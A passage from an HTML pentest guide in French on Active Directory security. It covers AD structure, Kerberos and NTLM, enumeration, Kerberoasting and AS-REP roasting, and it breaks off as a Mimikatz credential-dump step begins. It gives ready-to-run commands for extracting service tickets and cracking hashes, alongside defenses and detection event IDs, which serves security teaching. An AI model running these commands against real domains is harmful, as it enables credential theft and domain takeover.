@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory Security — SEC.NOTES</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap');
+:root{--bg:#04060d;--bg2:#080b15;--bg3:#0c101c;--border:#161e32;--a:#818cf8;--al:#a5b4fc;--a2:#f43f5e;--a3:#4ade80;--a4:#fb923c;--a5:#22d3ee;--a6:#facc15;--t:#b8c8e0;--td:#2d3f60;--tb:#e8f0ff}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--t);line-height:1.7;font-size:13px}
+.pb{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--a),var(--a5));z-index:999;transition:width .1s;width:0}
+.tn{background:#050810;border-bottom:1px solid var(--border);padding:9px 24px;display:flex;align-items:center;gap:12px;font-size:11px;position:sticky;top:0;z-index:200;flex-wrap:wrap}
+.tn a{color:var(--td);text-decoration:none;font-weight:700;transition:color .15s}.tn a:hover{color:var(--al)}.tn .cur{color:var(--al)}.tn .sep{color:var(--border)}
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:18px 32px;display:flex;align-items:center;gap:12px;position:sticky;top:37px;z-index:100;backdrop-filter:blur(12px);flex-wrap:wrap}
+.logo{font-family:'Syne',sans-serif;font-weight:800;font-size:17px;color:var(--al);letter-spacing:-.5px;white-space:nowrap}.logo span{color:var(--a2)}
+.badge{padding:3px 10px;border-radius:4px;font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
+.bp{background:rgba(129,140,248,.15);color:var(--al);border:1px solid rgba(129,140,248,.3)}
+.br{background:rgba(244,63,94,.12);color:#fb7185;border:1px solid rgba(244,63,94,.28)}
+.bg{background:rgba(74,222,128,.1);color:#86efac;border:1px solid rgba(74,222,128,.22)}
+.bc{background:rgba(34,211,238,.1);color:var(--a5);border:1px solid rgba(34,211,238,.22)}
+.ba{background:rgba(251,146,60,.1);color:#fcd34d;border:1px solid rgba(251,146,60,.22)}
+.hb{display:none;background:none;border:1px solid var(--border);color:var(--td);padding:5px 9px;border-radius:5px;cursor:pointer;font-size:17px;line-height:1;flex-shrink:0}
+.hb:hover{border-color:var(--al);color:var(--al)}
+.container{display:flex;min-height:100vh}
+nav{width:252px;min-width:252px;background:var(--bg2);border-right:1px solid var(--border);padding:16px 0;position:sticky;top:97px;height:calc(100vh - 97px);overflow-y:auto;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+nav::-webkit-scrollbar{width:3px}nav::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.nl{font-size:9px;text-transform:uppercase;letter-spacing:2px;color:var(--td);padding:12px 14px 4px;display:block}
+.nc{display:none;position:absolute;top:12px;right:12px;background:none;border:1px solid var(--border);color:var(--td);width:28px;height:28px;border-radius:4px;cursor:pointer;align-items:center;justify-content:center;font-size:14px}
+nav a{display:flex;align-items:center;gap:8px;padding:6px 14px;color:var(--td);text-decoration:none;font-size:11px;transition:all .15s;border-left:2px solid transparent}
+nav a:hover{color:var(--al);background:rgba(129,140,248,.05);border-left-color:var(--al)}
+nav a.active{color:var(--al);background:rgba(129,140,248,.08);border-left-color:var(--al)}
+.nn{font-family:'Syne',sans-serif;font-size:9px;font-weight:700;color:var(--a2);min-width:24px;background:rgba(244,63,94,.1);padding:1px 4px;border-radius:3px;text-align:center}
+main{flex:1;padding:32px 36px;overflow-x:hidden;max-width:calc(100% - 252px)}
+.hero{background:linear-gradient(135deg,rgba(129,140,248,.07),rgba(34,211,238,.04));border:1px solid rgba(129,140,248,.18);border-radius:12px;padding:30px 34px;margin-bottom:44px;position:relative;overflow:hidden}
+.hero::after{content:'AD';position:absolute;bottom:-14px;right:14px;font-family:'Syne',sans-serif;font-size:120px;font-weight:800;color:rgba(129,140,248,.04);letter-spacing:-4px}
+.hero h1{font-family:'Syne',sans-serif;font-size:26px;font-weight:800;color:var(--tb);margin-bottom:5px;letter-spacing:-1px}
+.hero h1 span{color:var(--al)}
+.hero-sub{color:var(--td);font-size:12px;margin-bottom:20px}
+.hs{display:flex;gap:12px;flex-wrap:wrap}
+.st{text-align:center;padding:9px 12px;background:rgba(0,0,0,.35);border-radius:6px;border:1px solid var(--border);min-width:70px}
+.sn{font-family:'Syne',sans-serif;font-size:19px;font-weight:800;color:var(--al);display:block}
+.sl{font-size:8px;color:var(--td);text-transform:uppercase;letter-spacing:1px}
+.section{margin-bottom:50px;scroll-margin-top:155px}
+.section-header{display:flex;align-items:center;gap:11px;margin-bottom:22px;padding-bottom:11px;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.snum{font-family:'Syne',sans-serif;font-size:10px;color:var(--td);letter-spacing:2px}
+h2{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--tb);letter-spacing:-.3px}
+h3{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;color:var(--al);margin:22px 0 9px;display:flex;align-items:center;gap:6px}
+h3::before{content:'▶';font-size:8px;opacity:.55}
+h4{font-size:11px;font-weight:700;color:var(--tb);margin:12px 0 5px;text-transform:uppercase;letter-spacing:.5px}
+p{margin-bottom:10px}ul{padding-left:18px;margin-bottom:10px}li{margin-bottom:4px}li::marker{color:var(--al)}
+.card{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin-bottom:12px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
+.cc::before{background:var(--a2)}.ch::before{background:var(--a4)}.cm2::before{background:var(--a5)}.cg::before{background:var(--a3)}.cp::before{background:var(--al)}.ca::before{background:var(--a6)}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:12px}.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:11px}
+pre,code{font-family:'JetBrains Mono',monospace}
+pre{background:#020408;border:1px solid var(--border);border-radius:6px;padding:13px 16px;overflow-x:auto;font-size:11px;line-height:1.65;margin:10px 0;-webkit-overflow-scrolling:touch;white-space:pre;max-width:100%}
+code{background:rgba(129,140,248,.1);color:var(--al);padding:2px 6px;border-radius:4px;font-size:11px}
+pre code{background:none;color:inherit;padding:0}
+.cm{color:#1e3050;font-style:italic}.kw{color:#c084fc}.str{color:#fde68a}.fn{color:#4ade80}.attr{color:#67e8f9}.val{color:#fb923c}.danger{color:var(--a2)}.safe{color:var(--a3)}.cmd{color:var(--a5)}
+.tw{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:11px 0}
+.tw table{min-width:460px;margin:0}
+table{width:100%;border-collapse:collapse;font-size:11.5px}
+th{background:rgba(129,140,248,.08);color:var(--al);padding:7px 11px;text-align:left;font-size:9.5px;text-transform:uppercase;letter-spacing:.8px;border-bottom:1px solid var(--border)}
+td{padding:7px 11px;border-bottom:1px solid rgba(22,30,50,.5);vertical-align:top}
+tr:last-child td{border-bottom:none}tr:hover td{background:rgba(129,140,248,.02)}
+.alert{padding:11px 15px;border-radius:6px;margin:10px 0;font-size:12px;display:flex;gap:8px;align-items:flex-start}
+.ai{font-size:14px;flex-shrink:0;margin-top:1px}
+.al-d{background:rgba(244,63,94,.07);border:1px solid rgba(244,63,94,.2);color:#fda4af}
+.al-i{background:rgba(34,211,238,.06);border:1px solid rgba(34,211,238,.18);color:#67e8f9}
+.al-g{background:rgba(74,222,128,.06);border:1px solid rgba(74,222,128,.18);color:#86efac}
+.al-p{background:rgba(129,140,248,.07);border:1px solid rgba(129,140,248,.2);color:#c4b5fd}
+.al-a{background:rgba(251,146,60,.07);border:1px solid rgba(251,146,60,.2);color:#fcd34d}
+.qi{border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden;transition:border-color .2s}
+.qi:hover{border-color:rgba(129,140,248,.3)}
+.qq{padding:11px 15px;cursor:pointer;display:flex;align-items:flex-start;gap:9px;background:var(--bg3);user-select:none}
+.qq:hover{background:rgba(129,140,248,.04)}
+.qn{font-size:9px;color:var(--a2);font-weight:700;min-width:24px;margin-top:2px;font-family:'Syne',sans-serif}
+.qt{flex:1;font-size:12px;color:var(--tb);font-weight:500}
+.qch{color:var(--td);font-size:11px;transition:transform .2s;margin-top:2px}
+.qi.open .qch{transform:rotate(180deg)}
+.qa{display:none;padding:13px 15px 13px 48px;background:var(--bg2);border-top:1px solid var(--border);font-size:12px;line-height:1.75}
+.qi.open .qa{display:block}
+.qa strong{color:#4ade80}.qa em{color:#fbbf24;font-style:normal;font-weight:600}
+.tt{display:inline-block;padding:2px 7px;border-radius:4px;background:rgba(129,140,248,.1);color:var(--al);border:1px solid rgba(129,140,248,.22);font-size:9.5px;font-weight:700;margin:2px;letter-spacing:.3px}
+.mitre{display:inline-block;padding:2px 7px;border-radius:3px;background:rgba(251,146,60,.1);color:#fb923c;border:1px solid rgba(251,146,60,.25);font-size:9px;font-weight:700;margin-left:5px;vertical-align:middle;letter-spacing:.5px}
+hr.d{border:none;border-top:1px solid var(--border);margin:28px 0}
+.hi{color:var(--al);font-weight:600}.dt{color:var(--a2);font-weight:600}.ok{color:var(--a3);font-weight:600}.wt{color:var(--a4);font-weight:600}.it{color:var(--a5);font-weight:600}
+.cl{list-style:none;padding:0}
+.cl li{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px solid rgba(22,30,50,.4);cursor:pointer}
+.cl li:last-child{border-bottom:none}
+.ck{width:14px;height:14px;border:1.5px solid var(--border);border-radius:3px;flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;font-size:9px;transition:all .15s}
+.cl li.done .ck{background:var(--a3);border-color:var(--a3);color:#000}
+.cl li.done span{text-decoration:line-through;color:var(--td)}
+.nov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;backdrop-filter:blur(4px)}
+.nov.active{display:block}
+</style>
+<link rel="stylesheet" href="mobile.css">
+</head>
+<body>
+<div class="pb" id="progress"></div>
+
+<div class="tn">
+  <a href="../index.html">← HOME</a><span class="sep">|</span>
+  <a href="web.html">🌐 Web</a><span class="sep">|</span>
+  <a href="llm.html">🤖 LLM</a><span class="sep">|</span>
+  <span class="cur">🏛️ Active Directory</span>
+</div>
+
+<header>
+  <button class="hb" id="hamburgerBtn" aria-label="Menu">☰</button>
+  <div class="logo">ACTIVE <span>DIRECTORY</span></div>
+  <span class="badge bp">PENTEST</span>
+  <span class="badge br">EXPLOITATION</span>
+  <span class="badge bg">DÉFENSE</span>
+  <span class="badge bc">MITRE ATT&amp;CK</span>
+</header>
+
+<div class="container">
+<nav id="sidebar">
+  <button class="nc" id="navClose">✕</button>
+  <span class="nl">Fondamentaux</span>
+  <a href="#intro"><span class="nn">01</span>Structure AD</a>
+  <a href="#kerberos"><span class="nn">02</span>Kerberos &amp; NTLM</a>
+  <a href="#enum"><span class="nn">03</span>Énumération</a>
+  <span class="nl">Attaques Credentials</span>
+  <a href="#kerberoast"><span class="nn">04</span>Kerberoasting</a>
+  <a href="#asrep"><span class="nn">05</span>AS-REP Roasting</a>
+  <a href="#pth"><span class="nn">06</span>Pass-the-Hash</a>
+  <a href="#ptt"><span class="nn">07</span>Pass-the-Ticket</a>
+  <a href="#llmnr"><span class="nn">08</span>LLMNR / NTLM Relay</a>
+  <span class="nl">Escalade &amp; Pivot</span>
+  <a href="#lateral"><span class="nn">09</span>Mouvement latéral</a>
+  <a href="#dcsync"><span class="nn">10</span>DCSync</a>
+  <a href="#acl"><span class="nn">11</span>ACL Abuse</a>
+  <span class="nl">Persistance</span>
+  <a href="#golden"><span class="nn">12</span>Golden / Silver Ticket</a>
+  <a href="#persist"><span class="nn">13</span>Persistance AD</a>
+  <span class="nl">ADCS</span>
+  <a href="#adcs"><span class="nn">14</span>ADCS — ESC1 à ESC8</a>
+  <span class="nl">Défense</span>
+  <a href="#defense"><span class="nn">15</span>Hardening &amp; Détection</a>
+  <a href="#tools"><span class="nn">★</span>Tooling</a>
+  <span class="nl">Entraînement</span>
+  <a href="#questions"><span class="nn">Q</span>Q&amp;A</a>
+  <a href="#checklist"><span class="nn">✓</span>Checklist</a>
+</nav>
+
+<main>
+<div class="hero">
+  <h1>Active Directory <span>Security</span></h1>
+  <p class="hero-sub">Bases · Protocoles · Attaques · ADCS · Persistance · Défense — Sources MITRE ATT&amp;CK + Microsoft + SpecterOps</p>
+  <div class="hs">
+    <div class="st"><span class="sn">15</span><span class="sl">Modules</span></div>
+    <div class="st"><span class="sn">30+</span><span class="sl">Attaques</span></div>
+    <div class="st"><span class="sn">ESC8</span><span class="sl">ADCS</span></div>
+    <div class="st"><span class="sn">ATT&CK</span><span class="sl">MITRE</span></div>
+  </div>
+</div>
+
+<!-- 01 STRUCTURE -->
+<section class="section" id="intro">
+  <div class="section-header"><span class="snum">01</span><h2>Structure Active Directory</h2><span class="badge bc">BASES</span></div>
+  <div class="alert al-p"><span class="ai">🏛️</span><div><strong>Active Directory Domain Services (AD DS)</strong> est le service d'annuaire de Microsoft présent dans ~95% des grandes entreprises. Il centralise l'authentification (Kerberos/NTLM), les autorisations (GPO, ACLs) et les politiques de sécurité. Compromettre le Domain Controller = compromettre tout le domaine.</div></div>
+
+  <h3>Composants critiques</h3>
+  <div class="g2">
+    <div class="card cp"><h4>Domain Controller (DC)</h4><p>Serveur exécutant AD DS. Contient <code>NTDS.dit</code>, authentifie les users, distribue les tickets Kerberos. <span class="dt">Cible finale</span> de toute attaque AD.</p></div>
+    <div class="card cp"><h4>NTDS.dit</h4><p>Base de données AD (<code>C:\Windows\NTDS\ntds.dit</code>). Contient <span class="dt">tous les objets AD, hashes NTLM, Kerberos keys</span>. Son extraction = compromission totale.</p></div>
+    <div class="card ch"><h4>SYSVOL</h4><p>Partage réseau répliqué sur tous les DCs. Contient les GPOs et scripts. Souvent source de <span class="wt">credentials en clair</span> dans des scripts legacy (Group Policy Preferences).</p></div>
+    <div class="card ch"><h4>krbtgt</h4><p>Compte service du KDC. Son hash NT chiffre <em>tous les TGTs</em> du domaine. Compromis → <span class="dt">Golden Ticket possible</span>. Ne change jamais par défaut.</p></div>
+  </div>
+
+  <h3>Hiérarchie Forest / Domain / OU</h3>
+  <pre><span class="cm">╔══════════════════════════════════════════════════════════╗
+║  FOREST : corp.local  (périmètre de sécurité ultime)    ║
+║  ┌──────────────────────────────────────────────────┐   ║
+║  │  DOMAIN : corp.local                             │   ║
+║  │  DC: dc01.corp.local  (NTDS.dit, SYSVOL, KDC)   │   ║
+║  │  ┌────────────┐  ┌────────────┐  ┌───────────┐  │   ║
+║  │  │ OU: Users  │  │OU:Servers  │  │OU:Groups  │  │   ║
+║  │  └────────────┘  └────────────┘  └───────────┘  │   ║
+║  └──────────────────────────────────────────────────┘   ║
+║         ↕  Trust (bidirectionnel par défaut)             ║
+║  ┌────────────────────────────┐                          ║
+║  │  DOMAIN : dev.corp.local   │ ← Child Domain           ║
+║  └────────────────────────────┘                          ║
+╚══════════════════════════════════════════════════════════╝</span>
+
+<span class="cm"># Objets AD essentiels</span>
+<span class="attr">User</span>        → UPN: john&#64;corp.local | sAMAccountName: john
+<span class="attr">Computer</span>    → MACHINE$ (dollar = machine account)
+<span class="attr">Service Acct</span>→ SPN: MSSQLSvc/db01.corp.local:1433
+<span class="attr">SID</span>         → S-1-5-21-{domain}-500  (RID 500 = Administrator)
+<span class="attr">GPO</span>         → Appliqué aux OUs → contrôle tout le domaine</pre>
+
+  <h3>Groupes privilégiés à connaître</h3>
+  <div class="tw"><table>
+    <tr><th>Groupe</th><th>Droits</th><th>Risque</th></tr>
+    <tr><td><code>Domain Admins</code></td><td>Admin sur tout le domaine</td><td>🔴 Cible principale — DA = game over</td></tr>
+    <tr><td><code>Enterprise Admins</code></td><td>Admin sur toute la forêt</td><td>🔴 Plus puissant que DA</td></tr>
+    <tr><td><code>Schema Admins</code></td><td>Modifier le schéma AD</td><td>🔴 Persistance indétectable possible</td></tr>
+    <tr><td><code>Backup Operators</code></td><td>Lire n'importe quel fichier (backup)</td><td>🟠 Peut lire NTDS.dit</td></tr>
+    <tr><td><code>Account Operators</code></td><td>Créer/modifier comptes (sauf DA)</td><td>🟠 Escalade possible</td></tr>
+    <tr><td><code>DnsAdmins</code></td><td>Gérer le service DNS</td><td>🟠 → DA via DLL injection</td></tr>
+    <tr><td><code>Protected Users</code></td><td>Politique de sécurité renforcée</td><td>✅ Groupe défensif</td></tr>
+  </table></div>
+
+  <h3>Protocoles d'authentification</h3>
+  <div class="tw"><table>
+    <tr><th>Protocole</th><th>Usage</th><th>Port</th><th>Risques principaux</th></tr>
+    <tr><td><strong>Kerberos v5</strong></td><td>Auth principale domaine joint</td><td>88/TCP+UDP</td><td>Kerberoasting, Golden/Silver Ticket, AS-REP, PTT</td></tr>
+    <tr><td><strong>NTLM / NTLMv2</strong></td><td>Legacy, fallback, IP directe</td><td>Any</td><td>Pass-the-Hash, NTLM Relay, Cracking</td></tr>
+    <tr><td><strong>LDAP / LDAPS</strong></td><td>Requêtes annuaire</td><td>389/636</td><td>Énumération anonyme, LDAP relay, injection</td></tr>
+    <tr><td><strong>SMB</strong></td><td>Partages, RPC, exécution distante</td><td>445</td><td>Relay, PsExec, EternalBlue (SMBv1)</td></tr>
+    <tr><td><strong>WinRM</strong></td><td>PowerShell remoting</td><td>5985/5986</td><td>Mouvement latéral (evil-winrm)</td></tr>
+    <tr><td><strong>RPC/WMI</strong></td><td>Administration distante</td><td>135+dyn</td><td>Exécution distante, DCSync</td></tr>
+  </table></div>
+</section>
+
+<!-- 02 KERBEROS -->
+<section class="section" id="kerberos">
+  <div class="section-header"><span class="snum">02</span><h2>Kerberos &amp; NTLM — Protocoles en profondeur</h2><span class="badge bc">FONDAMENTAL</span></div>
+
+  <h3>Flux Kerberos complet</h3>
+  <pre><span class="cm">CLIENT               KDC (DC)                  SERVICE
+  │                     │                          │
+  │──── AS-REQ ─────────►│  (username + timestamp   │
+  │     chiffré avec NT hash du user)               │
+  │                      │                          │
+  │◄─── AS-REP ──────────│  TGT chiffré clé krbtgt  │
+  │     + Session Key 1  │                          │
+  │  ↑ AS-REP Roasting : si pas de pré-auth →       │
+  │    le hash dans AS-REP est cracable offline      │
+  │                      │                          │
+  │──── TGS-REQ ─────────►│  TGT + SPN cible        │
+  │                      │                          │
+  │◄─── TGS-REP ──────────│  Service Ticket (TGS)   │
+  │     chiffré avec NT hash du compte service       │
+  │  ↑ Kerberoasting : tout user peut faire ça →    │
+  │    TGS hors ligne cracable si password faible   │
+  │                      │                          │
+  │──── AP-REQ ──────────────────────────────────►  │
+  │     [TGS présenté au service → accès accordé]   │</span>
+
+<span class="cm"># Acteurs clés</span>
+<span class="attr">KDC</span>     = Key Distribution Center (rôle du DC)
+<span class="attr">TGT</span>     = Ticket-Granting Ticket (~10h, renouvelable 7j)
+<span class="attr">TGS/ST</span> = Service Ticket (accès à 1 service spécifique)
+<span class="attr">krbtgt</span> = compte service KDC — son hash = clé de tout le domaine
+<span class="attr">SPN</span>     = Service Principal Name (ex: MSSQLSvc/db01:1433)
+<span class="attr">PAC</span>     = Privilege Attribute Certificate (memberships dans le TGT)</pre>
+
+  <h3>NTLM Challenge/Response</h3>
+  <pre><span class="cm">Client ──NEGOTIATE──────────────────────► Server
+Client ◄─CHALLENGE (nonce 8 bytes) ───── Server
+Client ──AUTHENTICATE ──────────────────► Server
+        [NTLMv2 = HMAC-MD5(NT hash, challenge + timestamp + cnonce)]</span>
+
+<span class="cm"># Types de hashes — à connaître absolument</span>
+<span class="attr">LM hash</span>   : aad3b435b51404eeaad3b435b51404ee  <span class="cm">(vide = toujours ce hash)</span>
+<span class="attr">NT hash</span>   : 32196b56ffe6f45e294117b91a83bf38  <span class="cm">(MD4 du mot de passe Unicode)</span>
+<span class="attr">NTLMv1</span>   : challenge/response MD4             <span class="cm">(faible, cracable facilement)</span>
+<span class="attr">NTLMv2</span>   : HMAC-MD5 avec challenge unique     <span class="cm">(réseau — relayable, pas PTH)</span></pre>
+
+  <div class="alert al-a"><span class="ai">⚡</span><div><strong>Point clé :</strong> Pass-the-Hash utilise le <em>NT hash</em> (statique). NTLMv2 est dynamique (challenge différent à chaque fois) — il ne peut pas être utilisé pour PTH mais peut être <em>relayé</em>.</div></div>
+</section>
+
+<!-- 03 ENUM -->
+<section class="section" id="enum">
+  <div class="section-header"><span class="snum">03</span><h2>Énumération Active Directory</h2><span class="badge ba">RECON</span></div>
+  <div class="alert al-i"><span class="ai">🔍</span><div>L'énumération AD ne nécessite qu'un <strong>compte utilisateur ordinaire</strong>. Par design, tout utilisateur du domaine peut lire la majorité des objets LDAP. C'est le comportement voulu — mais exploitable massivement.</div></div>
+
+  <h3>BloodHound / SharpHound — Cartographie des chemins d'attaque</h3>
+  <pre><span class="cm"># BloodHound = graphe Neo4j de toutes les relations AD
+# Trouve les chemins vers Domain Admins automatiquement</span>
+
+<span class="cm">## Collecte — SharpHound (Windows)</span>
+<span class="cmd">.\SharpHound.exe -c All --outputdirectory C:\temp\</span>
+<span class="cmd">.\SharpHound.exe -c All,GPOLocalGroup --ldapusername john --ldappassword Pass123</span>
+
+<span class="cm">## Collecte — bloodhound-python (Linux, sans Windows)</span>
+<span class="cmd">pip install bloodhound</span>
+<span class="cmd">bloodhound-python -u 'john' -p 'Pass123' -d corp.local -ns 10.10.10.10 -c all</span>
+
+<span class="cm">## Lancer BloodHound</span>
+<span class="cmd">sudo neo4j console &amp;</span>
+<span class="cmd">bloodhound</span>
+
+<span class="cm">## Cypher queries essentielles (Neo4j)</span>
+<span class="cm"># Chemin le plus court vers Domain Admins</span>
+MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
+
+<span class="cm"># Tous les users Kerberoastables membres de groupes privil.</span>
+MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group) WHERE g.highvalue=true RETURN u.name,g.name
+
+<span class="cm"># Comptes avec droits DCSync</span>
+MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
+
+<span class="cm"># Comptes avec mot de passe qui n'expire pas</span>
+MATCH (u:User {pwdneverexpires:true, enabled:true}) RETURN u.name</pre>
+
+  <h3>PowerView — Énumération PowerShell</h3>
+  <pre><span class="cmd">Import-Module .\PowerView.ps1</span>
+
+<span class="cm"># Domaine et DCs</span>
+<span class="cmd">Get-Domain ; Get-DomainController</span>
+<span class="cmd">Get-DomainPolicy | Select -ExpandProperty SystemAccess</span>
+
+<span class="cm"># Users (intéressants)</span>
+<span class="cmd">Get-DomainUser | select samaccountname,description,pwdlastset,admincount,memberof</span>
+<span class="cmd">Get-DomainUser -SPN</span>                    <span class="cm"># → Kerberoastables</span>
+<span class="cmd">Get-DomainUser -PreauthNotRequired</span>     <span class="cm"># → AS-REP Roastables</span>
+<span class="cmd">Get-DomainUser -AdminCount</span>             <span class="cm"># → membres anciens groupes admin</span>
+
+<span class="cm"># Groupes</span>
+<span class="cmd">Get-DomainGroupMember -Identity "Domain Admins" -Recurse</span>
+
+<span class="cm"># Machines</span>
+<span class="cmd">Get-DomainComputer | select name,operatingsystem,lastlogon | sort lastlogon -desc</span>
+
+<span class="cm"># ACLs dangereuses (WriteDACL, GenericAll, GenericWrite, ForceChangePassword)</span>
+<span class="cmd">Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReference,ObjectDN,ActiveDirectoryRights</span>
+
+<span class="cm"># GPO avec credentials</span>
+<span class="cmd">Get-DomainGPOLocalGroup</span></pre>
+
+  <h3>Impacket / CrackMapExec (Linux)</h3>
+  <pre><span class="cm">## Impacket — énumération sans GUI</span>
+<span class="cmd">impacket-GetADUsers -all corp.local/john:Pass123 -dc-ip 10.10.10.10</span>
+<span class="cmd">impacket-GetUserSPNs corp.local/john:Pass123 -dc-ip 10.10.10.10</span>
+<span class="cmd">impacket-lookupsid corp.local/john:Pass123@10.10.10.10</span>    <span class="cm"># enum SIDs</span>
+
+<span class="cm">## CrackMapExec / NetExec (nxc) — swiss army knife</span>
+<span class="cmd">crackmapexec smb 10.10.10.0/24 -u john -p Pass123</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 --users</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 --groups</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 --shares</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 --pass-pol</span>  <span class="cm"># politique MDP</span></pre>
+</section>
+
+<!-- 04 KERBEROASTING -->
+<section class="section" id="kerberoast">
+  <div class="section-header"><span class="snum">04</span><h2>Kerberoasting</h2><span class="badge br">CRITIQUE</span><span class="mitre">T1558.003</span></div>
+  <div class="card cc"><p><strong>Principe :</strong> Tout utilisateur authentifié peut demander un TGS pour n'importe quel SPN. Ce ticket est chiffré avec le NT hash du compte de service. L'attaquant extrait le ticket et le craque <em>offline</em> — zéro bruit après la demande initiale.</p></div>
+
+  <h3>Chaîne d'attaque</h3>
+  <pre><span class="cm">## 1. Trouver les comptes avec SPN (Kerberoastables)</span>
+<span class="cmd">Get-DomainUser -SPN | select samaccountname,serviceprincipalname</span>
+<span class="cmd">impacket-GetUserSPNs corp.local/john:Pass123 -dc-ip 10.10.10.10</span>
+
+<span class="cm">## 2. Requêter les TGS et extraire les hashes</span>
+
+<span class="cm"># Linux — Impacket (tout en un)</span>
+<span class="cmd">impacket-GetUserSPNs corp.local/john:Pass123 -dc-ip 10.10.10.10 -request -outputfile kerb_hashes.txt</span>
+
+<span class="cm"># Windows — Rubeus</span>
+<span class="cmd">.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt</span>
+<span class="cmd">.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb_hashes.txt</span>   <span class="cm"># force RC4 = plus rapide à cracker</span>
+<span class="cmd">.\Rubeus.exe kerberoast /user:svc_sql /outfile:kerb_hashes.txt</span> <span class="cm"># cibler 1 user</span>
+
+<span class="cm"># Windows — PowerView</span>
+<span class="cmd">Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerb_hashes.csv -NoTypeInformation</span>
+
+<span class="cm">## 3. Cracker offline</span>
+<span class="cmd">hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt</span>                       <span class="cm"># RC4</span>
+<span class="cmd">hashcat -m 19700 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule</span>   <span class="cm"># AES256</span>
+<span class="cmd">john --wordlist=rockyou.txt kerb_hashes.txt</span>
+
+<span class="cm">## Détection — Event IDs</span>
+<span class="cm">4769 : Kerberos Service Ticket Requested</span>
+<span class="cm">  → Ticket_Encryption_Type = 0x17 (RC4) + grand volume depuis 1 IP = SUSPECT</span></pre>
+
+  <h3>Défenses</h3>
+  <ul>
+    <li><span class="ok">gMSA / dMSA :</span> Group Managed Service Accounts → password 128 chars aléatoire, auto-rotaté</li>
+    <li>Passwords 30+ chars aléatoires sur tous les comptes de service existants</li>
+    <li>Désactiver RC4, forcer AES256 uniquement (msDS-SupportedEncryptionTypes)</li>
+    <li>Supprimer les SPNs inutiles — auditer régulièrement</li>
+    <li>Ne jamais donner des droits DA à un compte de service</li>
+  </ul>
+</section>
+
+<!-- 05 AS-REP -->
+<section class="section" id="asrep">
+  <div class="section-header"><span class="snum">05</span><h2>AS-REP Roasting</h2><span class="badge br">HIGH</span><span class="mitre">T1558.004</span></div>
+  <div class="card ch"><p>Si un compte a l'option <code>DONT_REQ_PREAUTH</code>, n'importe qui peut envoyer une AS-REQ sans s'authentifier. Le KDC répond avec une partie du message chiffrée avec le NT hash du user — cracable offline sans jamais avoir de compte valide.</p></div>
+
+  <pre><span class="cm">## Linux — sans credentials (si on a une liste d'usernames)</span>
+<span class="cmd">impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -no-pass -outputfile asrep.txt</span>
+
+<span class="cm">## Linux — avec credentials (énumère automatiquement)</span>
+<span class="cmd">impacket-GetNPUsers corp.local/john:Pass123 -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.txt</span>
+
+<span class="cm">## Windows — Rubeus</span>
+<span class="cmd">.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt</span>
+<span class="cmd">.\Rubeus.exe asreproast /user:vulnerable_user /format:hashcat /outfile:asrep.txt</span>
+
+<span class="cm">## Cracker</span>
+<span class="cmd">hashcat -m 18200 asrep.txt rockyou.txt</span>
+<span class="cmd">hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule</span>
+
+<span class="cm">## Trouver les comptes vulnérables (PowerView)</span>
+<span class="cmd">Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname</span></pre>
+
+  <div class="alert al-i"><span class="ai">💡</span><div><strong>Différence vs Kerberoasting :</strong> Kerberoasting cible les comptes de <em>service avec SPN</em> et nécessite un compte valide. AS-REP Roasting cible les <em>users avec pré-auth désactivée</em> et peut être fait anonymement.</div></div>
+</section>
+
+<!-- 06 PTH -->
+<section class="section" id="pth">
+  <div class="section-header"><span class="snum">06</span><h2>Pass-the-Hash (PtH)</h2><span class="badge br">CRITIQUE</span><span class="mitre">T1550.002</span></div>
+  <div class="card cc"><p>NTLM accepte le <strong>NT hash directement</strong> — pas besoin du mot de passe en clair. Si l'attaquant vole un NT hash (via Mimikatz, DCSync, SAM dump...), il peut s'authentifier sur toute machine où ce compte est valide.</p></div>
+
+  <pre><span class="cm">## 1. Obtenir les hashes NT</span>
+
+<span class="cm"># Mimikatz — dump LSASS en mémoire (nécessite admin)</span>
+<span class="cmd">privilege::debug</span>
